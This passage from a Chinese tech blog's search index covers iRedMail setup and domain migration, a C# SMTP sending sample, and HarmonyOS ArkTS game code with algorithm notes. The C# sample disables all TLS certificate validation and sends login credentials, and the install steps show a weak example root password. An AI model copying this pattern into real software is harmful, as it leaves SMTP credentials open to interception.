验证生效。\n步骤 2：更新主机名 修改主机名：\nhostnamectl set-hostname mail.mydomain.com 更新 /etc/hosts 文件：\n127.0.0.1 localhost 127.0.1.1 mail.mydomain.com mail 更新 /etc/mailname 文件：\nmail.mydomain.com 步骤 3：更新 iRedMail 配置文件 修改 Postfix 配置： 编辑 /etc/postfix/main.cf：\nmyhostname = mail.mydomain.com mydomain = mydomain.com myorigin = $mydomain 重启 Postfix：\nsystemctl restart postfix 修改 Dovecot 配置： 编辑 /etc/dovecot/dovecot.conf 和 /etc/dovecot/conf.d/10-mail.conf，确保更新主机名：\nssl_cert = \u0026lt;/etc/ssl/certs/mail.igrmail.pics.crt ssl_key = \u0026lt;/etc/ssl/private/mail.igrmail.pics.key 重启 Dovecot：\nsystemctl restart dovecot 修改 Amavisd 配置： 编辑 /etc/amavis/conf.d/50-user：\n$myhostname = \u0026#39;mail.mydomain.com\u0026#39;; 重启 Amavisd：\nsystemctl restart amavis 修改 iRedAdmin 配置： 编辑 /opt/www/iredadmin/settings.py：\nweb_hostname = \u0026#39;mail.igrmail.pics\u0026#39; 重启 iRedAdmin：\nsystemctl restart iredadmin 步骤 4：更新数据库记录 使用以下命令登录数据库（通常是 MySQL/MariaDB）：\nmysql -u root -p 更新 vmail 数据库中的域名：\nUSE vmail; UPDATE domain SET domain=\u0026#39;new\u0026#39; WHERE domain=\u0026#39;old\u0026#39;; UPDATE alias SET address=REPLACE(address, \u0026#39;old\u0026#39;, \u0026#39;@new\u0026#39;); UPDATE mailbox SET username=REPLACE(username, \u0026#39;@old\u0026#39;, \u0026#39;@new\u0026#39;); 步骤 5：重新生成 SSL 证书 如果你使用 Let’s Encrypt：\ncertbot --apache -d mail.xxx 将新生成的证书路径更新到相关服务的配置文件中（如 Postfix、Dovecot）。\n步骤 6：重启所有相关服务 确保所有服务都重启以加载新的配置：\nsystemctl restart postfix dovecot amavis clamav spamassassin iredapd iredadmin 步骤 7：验证配置 检查服务状态：\nsystemctl status postfix dovecot amavis 发送和接收测试邮件，确保新域名能正常工作。 验证 MX、SPF、DKIM 和 DMARC 记录是否正确。 完成这些步骤后，你的邮件服务器将会切换到新的域名。\ndebian 安装 MariaDB 在Debian系统上安装MariaDB，你可以按照以下步骤操作：\n更新系统包列表：\nsudo apt update 安装MariaDB服务器：\nsudo apt install mariadb-server 安全设置MariaDB，包括设置root密码和删除匿名用户：\nsudo mysql_secure_installation 启动MariaDB服务：\nsudo systemctl start mariadb 使MariaDB服务在系统启动时自动运行：\nsudo systemctl enable mariadb 登录MariaDB以确保一切正常：\nsudo mysql -u root -p 当系统提示输入密码时，输入你在安全设置步骤中设置的密码。\n以上步骤将在Debian系统上安装MariaDB，并确保其安全和自动启动。\n连接MariaDB (like mysql) SHOW DATABASES; SHOW TABLES;\n","permalink":"https://qfsyso.github.io/posts/update-domain-4-iredmail/","summary":"更换 iRedMail 的域名 （如从 mail.example.com 更换为 mail.mydomain.com）， 需要修改多个配置文件和数据库记录，并确保新的域名配置正确。 以下是操作步骤：\n步骤 1：更新 DNS 记录 在域名托管平台更新 mail.mydomain.com 的 DNS 记录： A记录：指向邮件服务器的 IP 地址。 MX记录：指向 mail.mydomain.com。 SPF 记录：确保包括新的域名。 DKIM 和 DMARC 记录：重新生成并更新。 确保 DNS 更改后可以通过 dig 或 nslookup 验证生效。\n步骤 2：更新主机名 修改主机名：\nhostnamectl set-hostname mail.mydomain.com 更新 /etc/hosts 文件：\n127.0.0.1 localhost 127.0.1.1 mail.mydomain.com mail 更新 /etc/mailname 文件：\nmail.mydomain.com 步骤 3：更新 iRedMail 配置文件 修改 Postfix 配置： 编辑 /etc/postfix/main.cf：\nmyhostname = mail.mydomain.com mydomain = mydomain.com myorigin = $mydomain 重启 Postfix：","title":"update domain 4 iRedMail"},{"content":"iRedMail iRedMail 是一个 shell 脚本，可以在 Linux/BSD 服务器上自动安装和配置所有必需的邮件服务器组件，从而消除手动安装和配置。借助 iRedMail，可以在基于 Web 的管理面板中轻松创建无限的邮箱和无限的邮件域。邮箱可以存储在 MariaDB/MySQL、PostreSQL 数据库或 OpenLDAP 中。以下是 iRedMail 将自动安装和配置的开源软件的列表。\nPostfixSMTP 服务器 Dovecot IMAP 服务器 Nginx 网络服务器，为管理面板和网络邮件提供服务 OpenLDAP、MySQL/MariaDB 或 PostgreSQL 用于存储用户信息 Amavided-用于 DKIM 签名和验证的新功能 SpamAssassin 用于反垃圾邮件 ClamAV 用于防病毒 Roundcube 网络邮件 SOGo组件，提供网络邮件、日历(CalDAV)、联系人(CardDAV)、任务和ActiveSync服务。 用于保护 SSH 的 Fail2ban mlmmj 邮件列表管理器 网络数据服务器监控 用于灰名单的 iRedAPD Postfix 策略服务器\n1.创建 DNS MX 记录 MX 记录指定哪个或哪些主机处理特定域名的电子邮件。例如，处理 linux-terminal.com 电子邮件的主机是 mail.linux-terminal.com。如果拥有 Gmail 帐户的人向 [email 发送电子邮件，则 Gmail 服务器将查询 linux-terminal.com 的 MX 记录。当发现mail.linux-terminal.com负责接收邮件时，它会查询mail.linux-terminal.com的A记录来获取IP地址，从而可以发送电子邮件。\n可以登录域名注册商的网站（例如 NameCheap）来创建 DNS 记录。\n在 DNS 管理器中，为域名创建 MX 记录。在“名称”字段中输入 @ 以表示主域名，然后在“值”字段中输入 mail.your-domain.com。\n注意：MX记录的主机名不能是其他名称的别名。另外，强烈建议使用主机名而不是裸 IP 地址作为 MX 记录。\nDNS 管理器可能会要求输入首选项值（也称为优先级值）。它可以是 0 到 65,356 之间的任意数字。小数字比大数字具有更高的优先级。建议将该值设置为0，这样该邮件服务器将具有最高的优先级来接收电子邮件。创建 MX 记录后，还需要为 mail.your-domain.com 创建 A 记录，以便将其解析为 IP 地址。如果服务器使用 IPv6 地址，请务必添加 AAAA 记录。\n提示：如果使用 Cloudflare DNS 服务，则在为 mail.your-domain.com 创建 A 记录时不应启用 CDN 功能。 Cloudflare 不支持 SMTP 代理。\n@ . mail A 记录 到 IP mail MX 记录到 mail.your-domain.com\n2.配置主机名 通过 SSH 登录服务器，然后运行以下命令来更新现有软件包。\nsudo apt update; sudo apt upgrade; 建议创建一个 sudo 用户来管理服务器，而不是使用默认的 root 用户。运行以下命令创建用户。将 username 替换为首选的用户名。\nadduser username 然后将用户添加到 sudo 组。\nadduser username sudo 然后切换到新用户。\nsu - username 接下来，使用以下命令为服务器设置完全限定域名 (FQDN)。 sudo hostnamectl set-hostname mail.your-domain.com 们还需要使用 Nano 等命令行文本编辑器更新 /etc/hosts 文件。\nsudo nano /etc/hosts 像下面这样编辑它。 （使用箭头键在文件中移动光标。）\n127.0.0.1 mail.your-domain.com localhost 保存并关闭文件。 （要在 Nano 文本编辑器中保存文件，请按 Ctrl+O，然后按 Enter 确认。要关闭文件，请按 Ctrl+X \u0026gt;.)\n要查看更改，请注销并重新登录，然后运行以下命令以查看主机名。\nhostname -f 3.使用 iRedMail 在 Debian 12 上设置邮件服务器 运行以下命令从其 Github 存储库下载最新版本的 iRedMail 脚本安装程序。\nwget https://github.com/iredmail/iRedMail/archive/1.6.4.tar.gz 提取存档文件。\ntar xvf 1.6.4.tar.gz 然后 cd 进入新创建的目录。\ncd iRedMail-1.6.4/ 为iRedMail.sh脚本添加可执行权限。\nchmod +x iRedMail.sh 接下来，使用 sudo 权限运行 Bash 脚本。\nsudo bash iRedMail.sh 将出现邮件服务器设置向导。使用 Tab 键选择 YES，然后按 Enter。 Welcome and thanks for your use\n下一个屏幕将要求选择邮件存储路径。可以使用默认的 /var/vmail，只需按 Enter 键即可。 sub-directory:/var/vmail/backup\n然后选择是否要运行 Web 服务器。强烈建议选择运行 Web 服务器，因为需要基于 Web 的管理面板来添加电子邮件帐户。 它还允许访问 Roundcube 网络邮件。默认情况下，选择 Nginx Web 服务器，因此只需按 Enter 键即可。 （星号表示该项目已被选中。） Nginx The fastest web server\n然后选择电子邮件帐户的存储后端。选择熟悉的一个。选择MariaDB。按上下方向键并按空格键进行选择。 select item.\n如果选择了 MariaDB 或 MySQL，那么将需要设置 MySQL root 密码。 123123.z root on server\n接下来，输入第一个邮件域。可以稍后在基于 Web 的管理面板中添加其他邮件域。本教程假设需要一个电子邮件帐户，例如[受保护的电子邮件]。在这种情况下，需要在此处输入 your-domain.com，不带子域。不要在域名后面按空格键。认为 iRedMail 会将空格字符与域名一起复制，这可能会导致安装失败。 Postfix won\u0026rsquo;t accept anyemail sent to this mail domain.\n接下来，设置邮件域管理员的密码。 iRedAdmin with this account.\n选择可选组件。默认情况下，选择 4 个项目。如果喜欢 SOGo 组件，请选择它并按 Enter。\nReview your settings 现在可以检查配置。输入 Y 开始安装所有邮件服务器组件。\n安装结束时，选择Y 使用iRedMail提供的防火墙规则并重新启动防火墙。 Y\n至此iRedMail安装完成。将收到网络邮件、SOGo 组件和网络管理面板的 URL 以及登录凭据的通知。 iRedMail.tips 文件包含有关 iRedMail 服务器的重要信息。 URLs of installed web applications:\nreboot 重启 https://mail.your-domain.com/iredadmin/ 访问管理面板 登录后 最后边添加-\u0026gt;用户 输入信息即可添加用户\nhttps://mail.your-domain.com/ 用户登录面板\n代码调用smtp发送示例 using System.Net.Mail; using System.Net; using System.Security.Cryptography.X509Certificates; using System.Net.Security; namespace ConsoleApp1Mail { internal class Program { static void Main(string[] args) { string smtpServer = \u0026#34;mail.myimmail.workxx\u0026#34;; int smtpPort = 587; string smtpUser = \u0026#34;postmaster@myimmail.workxx\u0026#34;; string smtpPassword = \u0026#34;xxx\u0026#34;; string recipientEmail = \u0026#34;reemail\u0026#34;; // 忽略证书验证 ServicePointManager.ServerCertificateValidationCallback = delegate ( object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) { return true; // 忽略所有证书错误 }; SendVerificationEmail(smtpServer, smtpPort, smtpUser, smtpPassword, recipientEmail); } static void SendVerificationEmail(string smtpServer, int smtpPort, string smtpUser, string smtpPassword, string recipientEmail) { string subject = \u0026#34;Email Verification\u0026#34;; string body = \u0026#34;This is your verification code: 123456\u0026#34;; try { using (SmtpClient client = new SmtpClient(smtpServer, smtpPort)) { client.Credentials = new NetworkCredential(smtpUser, smtpPassword); client.EnableSsl = true; // 启用 SSL MailMessage message = new MailMessage { From = new MailAddress(smtpUser), Subject = subject, Body = body }; message.To.Add(recipientEmail); client.Send(message); Console.WriteLine(\u0026#34;Email sent successfully!\u0026#34;); } } catch (Exception ex) { Console.WriteLine($\u0026#34;Error: {ex.Message}\u0026#34;); } } } } 安装完ired需要重启~ 总结 sudo hostnamectl set-hostname mail.yxx /etc/hosts 127.0.0.1 mail.ixgmail.xyz localhost hostname -f wget https://github.com/iredmail/iRedMail/archive/1.6.4.tar.gz tar xvf 1.6.4.tar.gz cd iRedMail-1.6.4/ chmod +x iRedMail.sh sudo bash iRedMail.sh 添加/更换新域名 登录 iredadmin Domains and Accounts add domain 添加新域名 add user 访问新域名 mail.newdomian.xyz/mail 能够访问登录即添加成功\n","permalink":"https://qfsyso.github.io/posts/iredmail-smtp/","summary":"iRedMail iRedMail 是一个 shell 脚本，可以在 Linux/BSD 服务器上自动安装和配置所有必需的邮件服务器组件，从而消除手动安装和配置。借助 iRedMail，可以在基于 Web 的管理面板中轻松创建无限的邮箱和无限的邮件域。邮箱可以存储在 MariaDB/MySQL、PostreSQL 数据库或 OpenLDAP 中。以下是 iRedMail 将自动安装和配置的开源软件的列表。\nPostfixSMTP 服务器 Dovecot IMAP 服务器 Nginx 网络服务器，为管理面板和网络邮件提供服务 OpenLDAP、MySQL/MariaDB 或 PostgreSQL 用于存储用户信息 Amavided-用于 DKIM 签名和验证的新功能 SpamAssassin 用于反垃圾邮件 ClamAV 用于防病毒 Roundcube 网络邮件 SOGo组件，提供网络邮件、日历(CalDAV)、联系人(CardDAV)、任务和ActiveSync服务。 用于保护 SSH 的 Fail2ban mlmmj 邮件列表管理器 网络数据服务器监控 用于灰名单的 iRedAPD Postfix 策略服务器\n1.创建 DNS MX 记录 MX 记录指定哪个或哪些主机处理特定域名的电子邮件。例如，处理 linux-terminal.com 电子邮件的主机是 mail.linux-terminal.com。如果拥有 Gmail 帐户的人向 [email 发送电子邮件，则 Gmail 服务器将查询 linux-terminal.com 的 MX 记录。当发现mail.linux-terminal.com负责接收邮件时，它会查询mail.linux-terminal.com的A记录来获取IP地址，从而可以发送电子邮件。\n可以登录域名注册商的网站（例如 NameCheap）来创建 DNS 记录。","title":" iRedMail smtp "},{"content":"环境 DevEco Studio NEXT Beta1 Build Version: 5.0 API 13\nWaste Sorting 垃圾分类\n算法 //springCurve回弹 animateToImmediately({ duration:800, curve: curves.springCurve(0, 20, 90, 20), // 其他配置 }); 初始偏移量、振幅、周期和阻尼系数，通过这些参数可以控制动画的弹性效果\n//Fisher-Yates洗牌 shuffleItems() { for (let i = this.garbageItems.length - 1; i \u0026gt; 0; i--) { const j = Math.floor(Math.random() * (i + 1)); let temp = this.garbageItems[i]; this.garbageItems[i] = this.garbageItems[j]; this.garbageItems[j] = temp; } } 代码 import { curves } from \u0026#39;@kit.ArkUI\u0026#39;; // 导入ArkUI工具包中的曲线模块 // 定义垃圾项目类 class GarbageItem { name: string; // 垃圾名称 type: number; // 垃圾类型 description?: string; // 垃圾描述，可选 // 构造函数初始化垃圾项目 constructor(name: string, type: number, description?: string) { this.name = name; // 设置垃圾名称 this.type = type; // 设置垃圾类型 this.description = description || \u0026#34;\u0026#34;; // 设置垃圾描述，默认为空字符串 } } // 定义垃圾类别类 class GarbageCategory { name: string; // 类别名称 type: number; // 类别类型 color: string; // 类别颜色 description: string; // 类别描述 // 构造函数初始化垃圾类别 constructor(name: string, type: number, color: string, description: string) { this.name = name; // 设置类别名称 this.type = type; // 设置类别类型 this.color = color; // 设置类别颜色 this.description = description; // 设置类别描述 } } // 使用组件装饰器定义一个名为Index的应用入口 @Entry @Component struct Index { // 定义状态变量 @State currentQuestionIndex: number = 0; // 当前题目索引 @State quizResults: string[] = []; // 测验结果数组 @State totalScore: number = 0; // 总得分 @State showAnimation: boolean = false; // 是否显示动画 @State scaleOptions: ScaleOptions = { x: 1, y: 1 }; // 缩放选项 @State itemXPosition: number = 0; // 物品X轴位置 @State itemOpacity: number = 1.0; // 物品透明度 // 初始化垃圾类别数组 @State garbageCategories: GarbageCategory[] = [ new GarbageCategory(\u0026#34;有害垃圾\u0026#34;, 0, \u0026#34;#e2413f\u0026#34;, \u0026#34;对人体健康或自然环境可能造成直接或潜在危害的生活垃圾\u0026#34;), // 创建有害垃圾类别 new GarbageCategory(\u0026#34;可回收物\u0026#34;, 1, \u0026#34;#1c6bb5\u0026#34;, \u0026#34;适宜回收和资源利用的物品\u0026#34;), // 创建可回收物类别 new GarbageCategory(\u0026#34;厨余垃圾\u0026#34;, 2, \u0026#34;#4ca84e\u0026#34;, \u0026#34;上海称湿垃圾，易腐烂的、含有机质的生活垃圾\u0026#34;), // 创建厨余垃圾类别 new GarbageCategory(\u0026#34;其他垃圾\u0026#34;, 3, \u0026#34;#5f5f5f\u0026#34;, \u0026#34;上海称干垃圾，不能归类于以上三类的生活垃圾\u0026#34;), // 创建其他垃圾类别 ]; @State garbageItems: GarbageItem[] = [ new GarbageItem(\u0026#34;菜帮菜叶\u0026#34;, 2), new GarbageItem(\u0026#34;剩菜剩饭\u0026#34;, 2), new GarbageItem(\u0026#34;过期食品\u0026#34;, 2), new GarbageItem(\u0026#34;瓜果皮壳\u0026#34;, 2), new GarbageItem(\u0026#34;鱼骨鱼刺\u0026#34;, 2), new GarbageItem(\u0026#34;鸡蛋及蛋壳\u0026#34;, 2), new GarbageItem(\u0026#34;残枝落叶\u0026#34;, 2), new GarbageItem(\u0026#34;茶叶渣\u0026#34;, 2), new GarbageItem(\u0026#34;酒瓶\u0026#34;, 1,), new GarbageItem(\u0026#34;玻璃杯\u0026#34;, 1), new GarbageItem(\u0026#34;调味瓶\u0026#34;, 1), new GarbageItem(\u0026#34;图书\u0026#34;, 1), new GarbageItem(\u0026#34;打印纸\u0026#34;, 1), new GarbageItem(\u0026#34;信封\u0026#34;, 1), new GarbageItem(\u0026#34;易拉罐\u0026#34;, 1), new GarbageItem(\u0026#34;金属刀具\u0026#34;, 1), new GarbageItem(\u0026#34;奶粉桶\u0026#34;, 1), new GarbageItem(\u0026#34;衣服裤子\u0026#34;, 1), new GarbageItem(\u0026#34;毛绒玩具\u0026#34;, 1), new GarbageItem(\u0026#34;鞋\u0026#34;, 1), new GarbageItem(\u0026#34;饮料瓶\u0026#34;, 1), new GarbageItem(\u0026#34;塑料盆\u0026#34;, 1), new GarbageItem(\u0026#34;食用油桶\u0026#34;, 1), new GarbageItem(\u0026#34;洗衣机\u0026#34;, 1), new GarbageItem(\u0026#34;电烤箱\u0026#34;, 1), new GarbageItem(\u0026#34;电视机\u0026#34;, 1), new GarbageItem(\u0026#34;充电电池\u0026#34;, 0), new GarbageItem(\u0026#34;废含汞荧光灯管\u0026#34;, 0), new GarbageItem(\u0026#34;过期药品及其包装物\u0026#34;, 0), new GarbageItem(\u0026#34;油漆桶\u0026#34;, 0), new GarbageItem(\u0026#34;血压计\u0026#34;, 0), new GarbageItem(\u0026#34;废水银温度计\u0026#34;, 0), new GarbageItem(\u0026#34;杀虫喷雾罐\u0026#34;, 0), new GarbageItem(\u0026#34;废X光片等感光胶片\u0026#34;, 0), new GarbageItem(\u0026#34;食品袋\u0026#34;, 3), new GarbageItem(\u0026#34;大棒骨\u0026#34;, 3), new GarbageItem(\u0026#34;创可贴\u0026#34;, 3), new GarbageItem(\u0026#34;污损塑料袋\u0026#34;, 3), new GarbageItem(\u0026#34;烟屁\u0026#34;, 3), new GarbageItem(\u0026#34;陶瓷碎片\u0026#34;, 3), new GarbageItem(\u0026#34;餐巾纸\u0026#34;, 3, \u0026#34;厕纸、卫生纸遇水即溶，不算可回收的“纸张”，类似的还有烟盒等。\u0026#34;), new GarbageItem(\u0026#34;卫生纸\u0026#34;, 3, \u0026#34;厕纸、卫生纸遇水即溶，不算可回收的“纸张”，类似的还有烟盒等。\u0026#34;), ]; // 在组件即将出现时重置测验 aboutToAppear(): void { this.resetQuiz(); // 调用重置测验方法 } // 重置测验状态 resetQuiz() { this.quizResults = []; // 清空测验结果 this.totalScore = 0; // 清零总得分 this.currentQuestionIndex = 0; // 重置当前题目索引 this.shuffleItems(); // 打乱垃圾项目顺序 } // 打乱垃圾项目顺序 shuffleItems() { for (let i = this.garbageItems.length - 1; i \u0026gt; 0; i--) { const j = Math.floor(Math.random() * (i + 1)); // 随机索引 let temp = this.garbageItems[i]; // 临时存储 this.garbageItems[i] = this.garbageItems[j]; // 交换位置 this.garbageItems[j] = temp; // 交换位置 } } // 检查用户选择的答案 checkAnswer(categoryType: number) { const currentItem = this.garbageItems[this.currentQuestionIndex]; // 获取当前垃圾项目 this.quizResults.push(`${currentItem.name}（${this.garbageCategories[categoryType].name}）【${currentItem.type === categoryType ? \u0026#34;✔\u0026#34; : this.garbageCategories[currentItem.type].name}】`); // 添加到测验结果中 if (currentItem.type === categoryType) { // 如果答案正确 this.totalScore += 10; // 加十分 } this.currentQuestionIndex++; // 进入下一个题目 if (this.currentQuestionIndex \u0026gt;= 10) { // 如果完成了十个题目 this.displayResults(); // 显示结果 this.resetQuiz(); // 重置测验 } } // 显示测验结果 displayResults() { let sheets: SheetInfo[] = []; // 初始化结果页面列表 for (let i = 0; i \u0026lt; this.quizResults.length; i++) { // 循环添加每一个结果 sheets.push({ title: this.quizResults[i], // 设置标题为测验结果 action: () =\u0026gt; { // 不执行任何操作 } }); } this.getUIContext().showActionSheet({ // 显示结果页 title: \u0026#39;成绩单\u0026#39;, // 标题 message: `总分数:${this.totalScore}`, // 分数信息 confirm: { // 确认按钮 defaultFocus: true, // 默认焦点 value: \u0026#39;我知道了\u0026#39;, // 按钮文本 action: () =\u0026gt; { // 点击后的动作 } }, onWillDismiss: () =\u0026gt; { // 关闭前的动作 }, alignment: DialogAlignment.Center, // 对齐方式为中心 sheets: sheets // 结果页面列表 }); } // 构建用户界面 build() { Column() { // 创建列布局 Text(`垃圾分类测验:${this.currentQuestionIndex + 1}/10`) // 显示当前题目序号 .fontSize(\u0026#39;30lpx\u0026#39;) // 设置字体大小 .margin(20); // 设置外边距 Stack() { // 创建堆栈布局 Text(`${this.garbageItems[this.currentQuestionIndex].name}`) // 显示当前垃圾项目名称 .textAlign(TextAlign.Center) // 居中对齐 .width(\u0026#39;130lpx\u0026#39;) // 设置宽度 .height(\u0026#39;130lpx\u0026#39;) // 设置高度 .border({ width: 1 }) // 设置边框宽度 .borderRadius(5) // 设置圆角半径 .fontColor(Color.White) // 设置字体颜色 .backgroundColor(Color.Orange) // 设置背景颜色 .fontSize(\u0026#39;20lpx\u0026#39;) // 设置字体大小 .padding(2) // 设置内边距 .scale(this.scaleOptions); // 设置缩放比例 if (this.showAnimation) { // 如果显示动画 Particle({ // 创建粒子效果 particles: [ // 初始化粒子数组 { emitter: { // 粒子发射器配置 particle: { // 粒子类型配置 type: ParticleType.POINT, // 粒子类型为点 config: { // 配置 radius: 5 // 点的半径 }, count: 50, // 粒子数量 lifetime: -1, // 生命周期 lifetimeRange: -1 // 生命周期范围 }, emitRate: 100, // 发射速率 position: [\u0026#39;25%\u0026#39;, 0], // 发射位置 size: [\u0026#39;100lpx\u0026#39;, \u0026#39;100lpx\u0026#39;], // 发射器大小 shape: ParticleEmitterShape.RECTANGLE // 发射器形状为矩形 }, color: { // 粒子颜色配置 range: [Color.Orange, Color.Orange], // 颜色范围 updater: { // 更新器配置 type: ParticleUpdater.CURVE, // 变化方式为曲线变化 config: [ // 配置项 { from: Color.Orange, // 起始颜色 to: Color.Orange, // 终止颜色 startMillis: 0, // 开始时间 endMillis: -1, // 结束时间 curve: Curve.FastOutLinearIn // 曲线类型 } ] } }, scale: { // 粒子大小配置 range: [0.8, 1.2], // 大小范围 updater: { // 更新器配置 type: ParticleUpdater.CURVE, // 变化方式为曲线变化 config: [ // 配置项 { from: 1.0, // 起始大小 to: 1.0, // 终止大小 startMillis: 0, // 开始时间 endMillis: -1, // 结束时间 curve: Curve.EaseIn } ] } }, // 粒子加速度配置 acceleration: { speed: { range: [8000, 10000], // 向下减速，模拟重力 updater: { type: ParticleUpdater.RANDOM, // 加速度线性变化 config: [400, 500] } }, angle: { range: [90, 90] // 方向固定向下 } }, } ] }).width(\u0026#34;100%\u0026#34;).height(\u0026#34;100%\u0026#34;); } } .width(\u0026#39;150lpx\u0026#39;) .height(\u0026#39;300lpx\u0026#39;) .align(Alignment.Top) .translate({x:`${this.itemXPosition}lpx`,y:0}); Row() { ForEach(this.garbageCategories, (category: GarbageCategory) =\u0026gt; { Column() { Text(category.name) .fontColor(Color.White) .fontSize(\u0026#39;30lpx\u0026#39;) .padding(5); Divider(); Text(category.description) .fontColor(Color.White) .fontSize(\u0026#39;28lpx\u0026#39;) .padding(5); } .backgroundColor(category.color) .height(\u0026#39;280lpx\u0026#39;) .width(\u0026#34;24%\u0026#34;) .border({ width: 1 }) .borderRadius(5) .margin({ left: 1, right: 1 }) .clickEffect({ scale: 0.8, level: ClickEffectLevel.MIDDLE }) .onClick(() =\u0026gt; { if(this.showAnimation){ return } this.showAnimation = true let itemX:number = 0 if(category.type==0){ itemX = -270 }else if(category.type==1){ itemX = -90 }else if(category.type==2){ itemX = 90 }else if(category.type==3){ itemX = 270 } animateToImmediately({ duration:200, onFinish:()=\u0026gt;{ animateToImmediately({ duration:800, curve: curves.springCurve(0, 20, 90, 20), onFinish:()=\u0026gt;{ animateToImmediately({ duration:200, onFinish:()=\u0026gt;{ this.itemXPosition = 0 this.checkAnswer(category.type); this.showAnimation = false } },()=\u0026gt;{ this.itemXPosition = 0 this.scaleOptions = { x: 1.0, y: 1.0 }; }) } },()=\u0026gt;{ this.scaleOptions = { x: 1.3, y: 1.3 }; }) } },()=\u0026gt;{ this.itemXPosition = itemX }) }); }); } Button(\u0026#39;重新开始\u0026#39;).clickEffect({ level: ClickEffectLevel.LIGHT }).margin({ top: 50 }).onClick(() =\u0026gt; { this.resetQuiz() }); }.width(\u0026#39;100%\u0026#39;); } } catch cat 围住神经猫\n算法 1. 广度优先搜索（BFS）： 广度优先搜索（Breadth-First Search，简称 BFS）是一种用于图和树结构的遍历或搜索算法。它从一个起始节点开始，首先访问该节点的所有邻接节点，然后再以同样的方式逐层访问这些邻接节点的邻接节点，直到访问完整个图或者找到目标节点为止。BFS的特点是按照从近到远的顺序访问节点，因此它非常适合用来寻找最短路径问题，尤其是在所有边的权重相等的情况下。\nBFS的基本步骤如下： 初始化：选择一个起始节点，将其放入队列，并标记为已访问。 循环处理： 从队列中取出第一个节点。 检查该节点是否为目标节点；如果是，则结束搜索。 否则，将该节点的所有未访问过的邻接节点加入队列，并标记为已访问。 终止条件：当队列为空时，表示所有可到达的节点都已经被访问过，如果此时还没有找到目标节点，则说明目标节点不可达。\n在 findNeighbors 方法中，通过遍历当前单元格的邻居来获取周围非墙壁且可以移动的单元格集合。这类似于广度优先搜索的思想，逐层遍历邻居单元格。\nfindNeighbors(cell: Cell): Cell[] { let neighbors: Cell[] = []; // 检查当前单元格的六个方向邻居，将非墙壁且可以移动的单元格加入集合 // ... return neighbors; } 2. 启发式搜索： 在 selectNextMove 方法中，根据一定的启发式函数选择下一个移动位置，以确保小猫朝着离边界最近的方向移动。这种启发式搜索可以帮助小猫更智能地选择下一步的移动位置。\nselectNextMove(emptyNeighbors: Cell[]): Cell { // 根据启发式函数选择最优的移动位置 // ... return closestToEdge || emptyNeighbors[0]; } 3. 曼哈顿距离计算： 曼哈顿距离（Manhattan Distance），也称为城市街区距离（City Block distance）或出租车几何，是衡量在标准坐标系中两个点之间沿轴向距离的总和。简单来说，它是从一个点到另一个点，在只允许水平或垂直移动的情况下，必须经过的最小距离。这个概念得名于美国纽约市曼哈顿区的街道布局，因为那里的街道大多呈网格状分布，车辆只能沿着这些街道行驶，而不能斜穿。\n在 computeHeuristic 方法中，使用曼哈顿距离计算启发式函数的值，以评估当前单元格到边界的距离。曼哈顿距离是在网格上两点之间的距离，沿着网格的边缘移动。\ncomputeHeuristic(cell: Cell): number { // 计算曼哈顿距离作为启发式函数的值 // ... return minDistanceX + minDistanceY; } wood fish 电子木鱼\nanimateToImmediately\n// 观察者模式装饰器 @ObservedV2 class Cell { value: string = \u0026#39;功德+1\u0026#39;; // 默认显示的文字 @Trace // 跟踪属性变化 opacity: number = 0; // 文字透明度 @Trace // 跟踪属性变化 y: number = 0; // 文字的垂直偏移量 } // 主入口组件 @Entry @Component struct Index { @State list: Cell[] = []; // 存储所有 Cell 对象的数组 indexCount: number = 0; // 记录当前滚动的索引 count: number = 10; // 列表中 Cell 对象的数量 image: string = \u0026#39;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQsAAADICAYAAAD/XsT8AAAAAXNSR0IArs4c6QAAEApJREFUeF7tnV921LgSh+093Hfg6S7iPgALmDUAKyFZyQwrubASYCWelMfqcXfabVkuSVXS1+eEhESWpV+Vv1Mq/fE48EGBgwpM0/R2GIYPy2Vvlu/yO/msv8vPvyKrl3KhrHz/vVx3+d04jrF1Rd6SYkcUGI8UpmxfCixQkAf+/QKBNSRqiLGGifz8YwHML0CS3xzAIr/GLu6wgOHT0liJGkLk4KL9q6jke4DIOI7yMx8lBYCFkpAeq1kBwiMcYiWXCASAxKr1oBywUBDRUxUrQHxe5Rc8deFsW8NQ5i+JQIg+4uUEFvFauS25AsST207kaziRR6S2wCJSKI/Fpmn6+jKW7zWCSDVZgMc3oo5rCYFFqksZvY4oQtUwAg6GK4ukwELVt+pVtkAiRBL1GtLunQM4JOLocr0HsHDu3NM0yUzGn50mK2tYr9thCrCo4W4K91wiCYGEt/UQCr03U4WA43kcRxmqNP8BFs5MzHDDpMHmIco4js8mW6fUKGChJGTuakhc5lZYpf6m8xrAQsVH8layTIGyRiKvzJq1NxlpAAtNF1Gui+SlsqDlqxNofGllvQawKO9Au3dkyLErkacCzUQZwMKY2y3RxP+NNYvmnFdANrNJlOF2jQawOO8EKjUwy6Eio/VKBBQfvQIDWBhwL6IJA0Yo1wS3wxJgUc5J7t5pmiZZWCWbvfj0o4BLYACLSg7KCsxKwtu67ZOnhVzAooLzMOyoILrdW8rKzy92m/dvy4BFYSuxwKqw4D5u5wIYwKKQMzHsKCS039t8H8fxo+XmA4sC1mHYUUDkNm4hrzR4Z7UrwCKzZQBFZoHbq94sMIBFRmcjP5FR3LarNgkMYJHJ6Vg/kUnYfqo1BwxgkcH5pmmSvR2cYJVB286qNDVLAiwUvY8ZD0UxqSooYAYYwELJKRdQ/FSqjmpQYK2ACWAACwWnBBQKIlLFngLVl4YDiz0T7fwdUJwUkMuPKFAVGMDiiKluygKKE+JxaaoC1YABLBJNxmKrROG4TEOBKsAAFgmmAxQJonGJpgJVXm4ELA6aEFAcFIziuRQofnI4sDhgSnIUB8SiaAkFigIDWESaFFBECkWx0goUOwQYWESYlpWZESJRpKYCRYABLCJMzF6PCJEoUluB7BvPgMWOiQFF7WeA+x9QICswgMUDSwCKA25KUSsKZNtHAiw2TAworPg+7UhQIAswgMUdS3DCVYJ7cok1BdRXeQKLGxOz6Mqaz9OeEwqoAgNYrCwBKE64JZdaVEB10RawWEzMoiuLvk6bFBRQW4MBLP6FBedmKngmVZhUQGVKFVgMw8DMh0kHp1G6CpzOX3QPC2Y+dD2S2swqcDp/0TUsSGiadWwalkeBU+9T7RYWS0JT8hRv89iFWlHAnAKnchc9w4KEpjlfpkEFFHg3jqMMSQ5/uoQFeYrDfsIFjSgwjmPyM598oVftyFN4tRzt1lAAWESqyMKrSKEo1qoCpzaYdRVZsJ6i1WeAfkUqACxihCJPEaMSZRpXIDm5Kbp0EVmQp2j8E